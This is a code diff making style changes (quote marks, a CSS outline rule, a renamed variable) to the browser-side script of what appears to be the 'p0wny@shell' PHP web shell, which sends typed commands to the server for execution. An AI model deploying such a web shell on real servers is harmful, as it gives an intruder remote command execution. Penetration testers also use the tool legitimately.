@@ -164,6 +164,7 @@ if (isset($_GET["feature"])) {
             #shell-input div {
                 flex-grow: 1;
                 align-items: stretch;
+                outline: none;
             }
 
             #shell-input input {
@@ -194,7 +195,7 @@ if (isset($_GET["feature"])) {
             function featureShell(command) {
 
                 _insertCommand(command);
-                makeRequest('?feature=shell', {cmd: command, cwd: CWD}, function(response) {
+                makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function(response) {
                     _insertStdout(response.stdout.join("\n"));
                     updateCwd(response.cwd);
                 });
@@ -240,9 +241,9 @@ if (isset($_GET["feature"])) {
                 var shortCwd = cwd;
                 if (cwd.split("/").length > 3) {
                     var splittedCwd = cwd.split("/");
-                    shortCwd = '…/' + splittedCwd[splittedCwd.length-2] + '/' + splittedCwd[splittedCwd.length-1];
+                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                return 'p0wny@shell:<span title="' + cwd + '">' + shortCwd + '</span>#';
+                return "p0wny@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
 
             function updateCwd(cwd) {
@@ -251,7 +252,7 @@ if (isset($_GET["feature"])) {
                     _updatePrompt();
                     return;
                 }
-                makeRequest('?feature=pwd', {}, function(response) {
+                makeRequest("?feature=pwd", {}, function(response) {
                     CWD = response.cwd;
                     _updatePrompt();
                 });
@@ -272,12 +273,12 @@ if (isset($_GET["feature"])) {
 
             function _onShellCmdKeyDown(event) {
                 switch (event.key) {
-                    case 'Enter':
+                    case "Enter":
                         featureShell(eShellCmdInput.value);
                         insertToHistory(eShellCmdInput.value);
                         eShellCmdInput.value = "";
                         break;
-                    case 'ArrowUp':
+                    case "ArrowUp":
                         if (historyPosition > 0) {
                             historyPosition--;
                             eShellCmdInput.blur();
@@ -285,7 +286,7 @@ if (isset($_GET["feature"])) {
                             eShellCmdInput.value = commandHistory[historyPosition];
                         }
                         break;
-                    case 'ArrowDown':
+                    case "ArrowDown":
                         if (historyPosition >= commandHistory.length) {
                             break;
                         }
@@ -315,21 +316,21 @@ if (isset($_GET["feature"])) {
                     var a = [];
                     for (var key in params) {
                         if (params.hasOwnProperty(key)) {
-                            a.push(encodeURIComponent(key) + '=' + encodeURIComponent(params[key]));
+                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
                         }
                     }
-                    return a.join('&');
+                    return a.join("&");
                 }
                 var xhr = new XMLHttpRequest();
-                xhr.open('POST', url, true);
-                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.open("POST", url, true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                 xhr.onreadystatechange = function() {
                     if (xhr.readyState === 4 && xhr.status === 200) {
                         try {
                             var responseJson = JSON.parse(xhr.responseText);
                             callback(responseJson);
-                        } catch (err) {
-                            alert('Error while parsing response: ' + err);
+                        } catch (error) {
+                            alert("Error while parsing response: " + error);
                         }
                     }
                 };
